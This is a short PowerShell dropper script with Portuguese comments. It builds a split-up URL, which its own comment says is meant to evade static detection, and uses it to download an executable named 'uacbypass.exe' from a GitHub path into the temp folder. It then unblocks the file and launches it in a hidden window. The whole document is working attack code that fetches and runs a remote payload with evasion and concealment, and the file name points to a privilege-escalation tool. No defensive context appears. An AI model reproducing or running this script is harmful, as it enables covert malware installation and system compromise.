# Ofuscação da URL (para evitar detecção estática)
$u = 'ht' + 'tps://github.com/gsfv/tro.j/raw/refs/heads/main/uacbypass.exe'
$p = "$env:TEMP\uacbypass.exe"

# Baixar com WebClient
(New-Object Net.WebClient).DownloadFile($u, $p)

# Desbloquear e executar
Unblock-File $p
Start-Process $p -WindowStyle Hidden
